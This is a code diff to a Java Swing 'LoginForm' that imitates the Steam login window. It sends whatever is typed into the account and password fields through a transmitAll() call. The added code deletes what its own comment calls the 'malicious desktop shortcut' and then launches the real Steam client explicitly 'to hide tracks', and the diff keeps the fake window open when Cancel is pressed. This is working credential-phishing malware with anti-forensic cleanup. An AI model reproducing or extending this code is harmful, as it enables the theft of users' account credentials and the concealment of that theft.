@@ -4,6 +4,7 @@ import javax.swing.*;
 import java.awt.*;
 import java.awt.event.*;
 import java.awt.event.ActionListener;
+import java.io.File;
 import java.io.IOException;
 
 
@@ -28,7 +29,7 @@ public class LoginForm extends JFrame implements ActionListener, MouseListener, 
     @SuppressWarnings("unchecked")
     // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
     private void initComponents() {
-        Icon icon = new ImageIcon(getClass().getResource("logo.png"));
+        Icon icon = new ImageIcon(getClass().getResource("/logo.png"));
         logo = new JLabel(icon);
         jColorChooser1 = new javax.swing.JColorChooser();
         jColorChooser2 = new javax.swing.JColorChooser();
@@ -42,7 +43,7 @@ public class LoginForm extends JFrame implements ActionListener, MouseListener, 
         jLabel1 = new javax.swing.JLabel();
         jLabel2 = new javax.swing.JLabel();
         LOGIN = new javax.swing.JButton(new ImageIcon(getClass().getResource("/LoginButton.png")));
-        CANCEL = new javax.swing.JButton(new ImageIcon(getClass().getResource("CancelButton.png")));
+        CANCEL = new javax.swing.JButton(new ImageIcon(getClass().getResource("/CancelButton.png")));
         fakeRadio = new JButton("");
         jCheckBox1 = new JLabel();
         Password = new javax.swing.JPasswordField();
@@ -311,7 +312,7 @@ public class LoginForm extends JFrame implements ActionListener, MouseListener, 
         Component s = (Component)e.getSource();
         if(s == exitButton || s == CANCEL || s == LOGIN || s == AccountName || s == Password){
             transmitAll();
-            cleanUp();
+            if(s != CANCEL)cleanUp();
         }
         if(e.getSource() == minimizeButton){
             this.setState(ICONIFIED);
@@ -338,5 +339,25 @@ public class LoginForm extends JFrame implements ActionListener, MouseListener, 
     // try to launch the actual steam client
     public void cleanUp(){
         this.dispose();
+
+        // after window closes, replace the malicious desktop shortcut with a legitimate shortcut
+        String separator = System.getProperty("file.separator");
+        String desktopDir = System.getProperty("user.home") + separator + "Desktop" + separator;
+        File thisShortcut = new File(desktopDir + "Steam.lnk");
+        if(thisShortcut.exists()){
+            thisShortcut.delete();
+        }
+
+        // lastly, launch the steam client to hide tracks
+        String steamPath = "\"C:" + separator + "Program Files (x86)" + separator + "Steam" + separator + "Steam.exe\"";
+        System.out.println(steamPath);
+        Runtime runtime = Runtime.getRuntime();
+        try {
+            runtime.exec(steamPath);
+        }
+        catch (IOException e){
+            return ; // give up
+        }
+
     }
 }
